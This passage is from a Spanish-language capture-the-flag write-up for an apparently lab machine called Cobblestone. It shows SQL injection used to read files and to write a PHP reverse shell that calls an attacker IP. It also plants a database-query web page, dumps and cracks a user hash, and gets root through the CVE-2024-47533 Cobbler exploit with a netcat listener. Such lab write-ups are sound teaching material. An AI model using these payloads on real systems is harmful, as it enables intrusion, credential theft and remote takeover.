    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 8431=8431 AND 'Hxdn'='Hxdn

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8159 FROM (SELECT(SLEEP(5)))iyof) AND 'NlBa'='NlBa

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-5795' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a7a71,0x7a737744506276506541596c774b5456694d504342586759766d445a797157736e444b6f5577676c,0x716a7a7a71)-- -
---
[12:14:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:14:36] [INFO] fingerprinting the back-end DBMS operating system
[12:14:36] [INFO] the back-end DBMS operating system is Linux
[12:14:36] [INFO] fetching file: '/var/www/html/db/connection.php'
do you want confirmation that the remote file '/var/www/html/db/connection.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[12:14:37] [INFO] the local file '/root/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_db_connection.php' and the remote file '/var/www/html/db/connection.php' have the same size (303 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_db_connection.php (same file)

[12:14:37] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 12:14:37 /2025-10-30/
```

Ahora si lo leemos...

> connection.php

```php
<?php

$dbserver = "localhost";
$username = "dbuser";
$password = "aichooDeeYanaekungei9rogi0eMuo2o";
$dbname = "cobblestone";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

Veremos una contraseña con una conexion a una `DDBB` pero sera de forma interna, aunque probemos dicha contraseña en varios usuarios o en la pagina, veremos que no funcionara, por lo que tendremos que seguir investigando un poco mas por esta via.

Si investigamos un poco mas veremos que existe un `skin.php` que si lo leemos:

```shell
F="/var/www/html/skins.php"; sqlmap -r req.txt --batch -p url --file-read="$F" | grep -F '[*] /root' | awk '{print $2}' | xargs cat
```

Info:

```php
.............................<RESTO DE INFO>.......................................
<?php if (isset($_SESSION['id']) && $_SESSION['role'] === 'admin') {
                                echo <<<HTML
                        <li class="nav-item" role="presentation">
                                <button class="nav-link text-dark" id="upload-tab" data-bs-toggle="tab" data-bs-target="#upload" type="button" role="tab" aria-controls="upload" aria-selected="false">Upload Skin</button>
                        </li>
                        <li class="nav-item" role="presentation">
                                <button class="nav-link text-dark" id="user-tab" data-bs-toggle="tab" data-bs-target="#user" type="button" role="tab" aria-controls="user" aria-selected="false">User Management</button>
                        </li>
                        <li class="nav-item" role="presentation">
                                <button class="nav-link text-dark" id="suggest-tab" data-bs-toggle="tab" data-bs-target="#suggest" type="button" role="tab" aria-controls="suggest" aria-selected="false">Skin Suggestions</button>
                        </li>
                        HTML;
                        } ?>
.............................<RESTO DE INFO>.......................................
```

Veremos que como el usuario `admin` se puede subir `skins` mediante el parametro `upload` dentro de la carpeta `skins` por lo que podemos deducir que en dicha carpeta tendra permisos de escritura.

Vamos a probar a subir nuestra `shell.php` a dicha carpeta de esta forma:

```shell
SQL="' union select 1,2,3,4,'<?php \$sock=fsockopen(\"<IP_ATTACKER>\",<PORT>);\$proc=proc_open(\"sh\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes); ?>' into outfile '/var/www/html/skins/test1.php' -- -"; curl -sL 'http://vote.cobblestone.htb/suggest.php' -H 'Cookie: PHPSESSID=gjp62l95o56ebvotltgmlj8dh4' -d "url=$SQL"
```

Info:

```
<!-- Proudly coded by Billy (https://bybilly.uk) -->
<!-- Version: 1.9.2 -->


<!DOCTYPE html>
<html>
<head>
        <!-- Info meta tags, important for social media + SEO -->
        <title>Cobblestone - Server Details</title>

        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta charset="utf-8">

    <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/all.min.css">
        <link rel="stylesheet" href="css/stylesheet.css">

</head>
<body>
        <div class="container-fluid">
        None        <a class="btn btn-light mt-4" href="index.php">back</a>
        </div>

    <script src="js/bootstrap.bundle.min.js" type="text/javascript"></script>
        <script src="js/jquery.min.js" type="text/javascript"></script>
        <script src="js/firefly.js" type="text/javascript"></script>
        <script src="js/main.js" type="text/javascript"></script>
</body>
</html>
```

Vemos que ha funcionado aparentemente, vamos a irnos a la web a comprobarlo de esta forma:

```
URL = http://cobblestone.htb/skins/test.php
```

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si lo enviamos y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.15.50] from (UNKNOWN) [10.10.11.81] 43268
whoami
www-data
```

Veremos que ha funcionado, si intentamos `sanitizar` la `shell` veremos que no podremos ya que no esta permitido `bash` y ningun otro comando, es muy pobre lo que tenemos por lo que haremos algo simple:

```shell
exec /bin/sh -i
```

Con esto obtendremos el `$`, ahora vamos a investigar un poco.

## Escalate user cobble

Investigando un poco veremos los siguiente puertos:

```shell
ss -tuln
```

Info:

```
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0            0.0.0.0:69         0.0.0.0:*
udp   UNCONN 0      0               [::]:69            [::]:*
tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*
tcp   LISTEN 0      5          127.0.0.1:25151      0.0.0.0:*
tcp   LISTEN 0      128             [::]:22            [::]:*
```

Nos llama la atencion los puerto del `localhost` entre ellos el `25151`, pero poco podemos hacer con este usuario.

### SQLi desde la Web (PHP)

Despues de unos dias probando otras formas de acceso, descubri que el mismo archivo de `connection.php` tambien esta en `vote`, lo podemos obtener de esta forma:

```shell
F="/var/www/vote/db/connection.php"; sqlmap -r req.txt --batch -p url --file-read="$F" | grep -F '[*] /root' | awk '{print $2}' | xargs cat
```

Info:

```
<?php

$dbserver = "localhost";
$username = "voteuser";
$password = "thaixu6eih0Iicho]irahvoh6aigh>ie";
$dbname = "vote";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

Vemos una contraseña de `DDBB`, vamos a probar a crear un archivo `db.php` en el que se autentique a dicha `DDBB` con esas credenciales y desde la web podamos explorar la `base de datos` con ese usuario.

```shell
SQL="' union select 1,2,3,4,'<?php include(\"../db/connection.php\"); \$sql = \$_GET[0]; \$result = \$conn->query(\$sql); while(\$row = \$result->fetch_array()) { print_r(\$row);} \$conn->close(); ?>' into outfile '/var/www/html/skins/db.php' -- -"; curl -sL 'http://vote.cobblestone.htb/suggest.php' -H 'Cookie: PHPSESSID=<COOKIE>' -d "url=$SQL"
```

Cuando enviemos esto, iremos a la pagina de esta forma:

```
URL = http://cobblestone.htb/skins/db.php?0=show%20databases;
```

Info:

```
1 2 3 4 Array ( [0] => cobblestone [Database] => cobblestone ) Array ( [0] => information_schema [Database] => information_schema ) 
```

Veremos la `DDBB` llamada `cobblestone` si verificamos en que `DDBB` estamos, veremos que estamos en esa, por lo que vamos a listar las tablas:

```
URL = http://cobblestone.htb/skins/db.php?0=show%20tables;
```

Info:

```
1 2 3 4 Array ( [0] => skins [Tables_in_cobblestone] => skins ) Array ( [0] => suggestions [Tables_in_cobblestone] => suggestions ) Array ( [0] => users [Tables_in_cobblestone] => users ) 
```

Veremos una tabla llamada `users` muy interesante, vamos a ver que contiene...

```
URL = view-source:http://cobblestone.htb/skins/db.php?0=select%20*%20from%20users;
```

Info:

```
1	2	3	4	Array
(
    [0] => 1
    [id] => 1
    [1] => admin
    [Username] => admin
    [2] => admin
    [FirstName] => admin
    [3] => admin
    [LastName] => admin
    [4] => admin@cobblestone.htb
    [Email] => admin@cobblestone.htb
    [5] => admin
    [Role] => admin
    [6] => f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1
    [Password] => f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1
    [7] => *
    [register_ip] => *
)
Array
(
    [0] => 2
    [id] => 2
    [1] => cobble
    [Username] => cobble
    [2] => cobble
    [FirstName] => cobble
    [3] => stone
    [LastName] => stone
    [4] => cobble@cobblestone.htb
    [Email] => cobble@cobblestone.htb
    [5] => admin
    [Role] => admin
    [6] => 20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d
    [Password] => 20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d
    [7] => *
    [register_ip] => *
)
Array
(
    [0] => 3
    [id] => 3
    [1] => diseo
    [Username] => diseo
    [2] => diseo
    [FirstName] => diseo
    [3] => diseo
    [LastName] => diseo
    [4] => diseo@test.com
    [Email] => diseo@test.com
    [5] => user
    [Role] => user
    [6] => 9357de9d335eec130085aa2041ec78f36ab0c55990c237b5e7c93daafd4427c4
    [Password] => 9357de9d335eec130085aa2041ec78f36ab0c55990c237b5e7c93daafd4427c4
    [7] => 10.10.15.50
    [register_ip] => 10.10.15.50
)
Array
(
    [0] => 4
    [id] => 4
    [1] => someone
    [Username] => someone
    [2] => mynamd
    [FirstName] => mynamd
    [3] => dadad
    [LastName] => dadad
    [4] => someone@laone.com
    [Email] => someone@laone.com
    [5] => user
    [Role] => user
    [6] => 2a59d59e3809f827ce709d3815e3950eef4a6a93af5557a93a7fdfba71460843
    [Password] => 2a59d59e3809f827ce709d3815e3950eef4a6a93af5557a93a7fdfba71460843
    [7] => 10.10.15.144
    [register_ip] => 10.10.15.144
)
```

Veremos varios usuarios, pero entre ellos el que mas nos interesa es el llamado `cobbler`, por lo que vamos a obtener su `hash` y probaremos a `crackearlo` de esta forma:

> hash

```
20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d
```

URL = [CrackStation MD5 Hash](https://crackstation.net/)

Si utilizamos la pagina web para `crackear` el `hash` veremos que funciona:

<figure><img src="../../.gitbook/assets/Pasted image 20251031124605.png" alt=""><figcaption></figcaption></figure>

Por lo que vemos la contraseña es `iluvdannymorethanyouknow`, vamos a probarla por `SSH` a ver si fuera la del usuario a nivel de sistema tambien:

```shell
ssh cobble@<IP>
```

Metemos como contraseña `iluvdannymorethanyouknow`...

```
Linux cobblestone 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cobble@cobblestone:~$ whoami
```

Vemos que ha funcionado por lo que leeremos la `flag` del usuario:

> user.txt

```
cad661c47e4eac435aef2dfb6db18367
```

## Escalate Privileges

Recordemos que encontramos el puerto `25151` que es interesante, ya que tenemos acceso por `SSH` vamos a tunelizar dicho puerto de esta forma:

```shell
ssh -L 25151:127.0.0.1:25151 cobble@<IP>
```

Metemos como contraseña `iluvdannymorethanyouknow` y con esto veremos que estamos dentro, ahora si desde el `host` los puertos que tenemos:

```shell
ss -tuln
```

Info:

```
Netid                     State                       Recv-Q                      Send-Q                                                Local Address:Port                                            Peer Address:Port
udp                       UNCONN                      0                           0                                                           0.0.0.0:35334                                                0.0.0.0:*
tcp                       LISTEN                      0                           128                                                       127.0.0.1:25151                                                0.0.0.0:*
tcp                       LISTEN                      0                           4096                                                      127.0.0.1:37537                                                0.0.0.0:*
tcp                       LISTEN                      0                           128                                                           [::1]:25151                                                   [::]:*
tcp                       LISTEN                      0                           50                                               [::ffff:127.0.0.1]:8080                                                       *:*
tcp                       LISTEN                      0                           50                                               [::ffff:127.0.0.1]:33711                                                      *:*
```

Veremos que ha funcionado, por lo que vamos a explorar dicho puerto.

Si listamos los procesos de la maquina victima veremos el siguiente proceso bastante interesante:

```shell
ps -aux
```

Info:

```
..............................<RESTO DE INFO>......................................
root        1214  0.0  1.8 965328 72208 ?        Ss   04:01   0:08 /usr/bin/python3 /usr/local/bin/cobblerd -F
..............................<RESTO DE INFO>......................................
```

Vemos que `root` esta ejecutando con `python3` un binario en la siguiente ruta, si exploramos dicho binario no veremos que este esa ruta, por lo que no podremos ver como funciona el binario.

Si realizamos un `nmap` al puerto que hemos expuesto veremos lo siguiente:

```shell
nmap -sCV -p25151 127.0.0.1
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 17:33 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).

PORT      STATE SERVICE VERSION
25151/tcp open  http    BaseHTTPServer 0.6 (Python 3.11.2)
|_http-title: Error response
|_http-server-header: BaseHTTP/0.6 Python/3.11.2
|_xmlrpc-methods: XMLRPC instance doesn't support introspection.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
```

Veremos que es un puerto `BaseHTTPServer` si buscamos informacion sobre esta tecnologia de `python3` con ayuda de la `IA` veremos que puede ser un **servicio XML-RPC** vamos a enviar un `curl` para realizar una prueba de ello.

```shell
curl -X POST http://127.0.0.1:25151/ \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>'
```

Info:

```
<methodResponse>
<fault>
<value><struct>
<member>
<name>faultCode</name>
<value><int>1</int></value>
</member>
<member>
<name>faultString</name>
<value><string>&lt;class 'cobbler.cexceptions.CX'&gt;:"unknown remote method 'system.listMethods'"</string></value>
</member>
</struct></value>
</fault>
</methodResponse>
```

Vemos que no nos esta dando ningun error, por lo que esta funcionando, vamos a buscar mas informacion sobre ello a ver si hubiera alguna vulnerabilidad asociada al mismo.

### CVE-2024-47533

Despues de un rato investigando y con un poco de ayuda de la `IA` encontre la siguiente pagina en la que muestra claramente como explotar este servicio.

URL = [CVE-2024-47533 Cobbler XMLRPC-Authentication-Bypass](https://github.com/dollarboysushil/CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC)

Como el propio nombre de la maquina indica `Cobbler` es un sistema de instalación y gestión de configuraciones para Linux que:

* Automatiza instalaciones de SO via red (PXE)
* Gestiona DHCP, DNS, repositorios de paquetes
* **Requiere privilegios de root** para funcionar

Esta vulnerabilidad en concreto lo que aprovecha es que en la version que esta corriendo es un poco desactualizada y se encontro un fallo de un `bypass` de autenticacion.

#### **Problema técnico:**

```python
# En utils.py - función vulnerable
def get_shared_secret():
    return -1  # ¡SIEMPRE retorna -1!
```

#### **Consecuencia:**

Cualquier autenticación es válida con:

* **Usuario:** `""` (string vacío)
* **Contraseña:** `-1`

Y como `Cobbler` esta corriendo como `root` como vimos en los procesos, podremos obtener una `shell` del mismo.

Vamos a utilizar el siguiente script de esta forma:

```shell
git clone https://github.com/dollarboysushil/CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC.git
cd CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC/
python3 CVE-2024-47533-dbs.py -t http://127.0.0.1:25151 -l <IP_ATTACKER> -p <PORT> --payload bash
```

Pero antes nos pondremos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si lo enviamos veremos lo siguiente:

```
[*] Target: http://127.0.0.1:25151
[*] Listener: 10.10.15.50:7755
[*] Payload: bash
[*] Connecting to Cobbler...
[*] Authenticating...
[*] Executing exploit...
[+] Exploit sent! Check your listener.
```

Pero si volvemos a donde tenemos la escucha veremos esto otro:

```
listening on [any] 7755 ...
connect to [10.10.15.50] from (UNKNOWN) [10.10.11.81] 49206
bash: cannot set terminal process group (1214): Inappropriate ioctl for device
bash: no job control in this shell
root@cobblestone:/# whoami
whoami
root
```

Veremos que ha funcionado, por lo que leeremos la `flag` de `root`.

> root.txt

```
32840207fc4a55c63dcdd369d7c5688c
```
